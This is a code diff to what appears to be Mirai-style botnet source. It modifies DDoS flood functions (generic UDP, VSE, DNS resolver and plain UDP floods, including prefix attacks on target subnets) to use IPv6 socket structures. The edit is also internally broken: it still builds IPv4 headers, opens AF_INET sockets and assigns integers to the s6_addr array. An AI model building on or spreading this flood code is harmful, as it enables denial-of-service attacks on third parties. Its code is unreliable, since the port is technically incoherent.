@@ -115,8 +115,8 @@ void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t 
             udph->check = 0;
             udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + data_len);
 
-            targs[i].sock_addr.sin_port = udph->dest;
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+            targs[i].sock_addr.sin6_port = udph->dest;
+            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in6));
         }
 #ifdef DEBUG
 //            break;
@@ -216,8 +216,8 @@ void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             udph->check = 0;
             udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
 
-            targs[i].sock_addr.sin_port = udph->dest;
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+            targs[i].sock_addr.sin6_port = udph->dest;
+            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in6));
         }
 #ifdef DEBUG
 //            break;
@@ -360,9 +360,9 @@ void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             udph->check = 0;
             udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));
 
-            targs[i].sock_addr.sin_addr.s_addr = dns_resolver;
-            targs[i].sock_addr.sin_port = udph->dest;
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+            targs[i].sock_addr.sin6_addr.s6_addr = dns_resolver;
+            targs[i].sock_addr.sin6_port = udph->dest;
+            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in6));
         }
 #ifdef DEBUG
 //            break;
@@ -385,7 +385,7 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
     port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
     uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
     BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
-    struct sockaddr_in bind_addr = {0};
+    struct sockaddr_in6 bind_addr = {0};
 
     if (sport == 0xffff)
     {
@@ -407,9 +407,9 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
         pkts[i] = calloc(65535, sizeof (char));
 
         if (dport == 0xffff)
-            targs[i].sock_addr.sin_port = rand_next();
+            targs[i].sock_addr.sin6_port = rand_next();
         else
-            targs[i].sock_addr.sin_port = htons(dport);
+            targs[i].sock_addr.sin6_port = htons(dport);
 
         if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
         {
@@ -419,11 +419,11 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
             return;
         }
 
-        bind_addr.sin_family = AF_INET;
-        bind_addr.sin_port = sport;
-        bind_addr.sin_addr.s_addr = 0;
+        bind_addr.sin6_family = AF_INET6;
+        bind_addr.sin6_port = sport;
+        bind_addr.sin6_addr.s6_addr = 0;
 
-        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
+        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in6)) == -1)
         {
 #ifdef DEBUG
             printf("Failed to bind udp socket.\n");
@@ -432,9 +432,9 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
 
         // For prefix attacks
         if (targs[i].netmask < 32)
-            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
+            targs[i].sock_addr.sin6_addr.s6_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
 
-        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
+        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in6)) == -1)
         {
 #ifdef DEBUG
             printf("Failed to connect udp socket.\n");
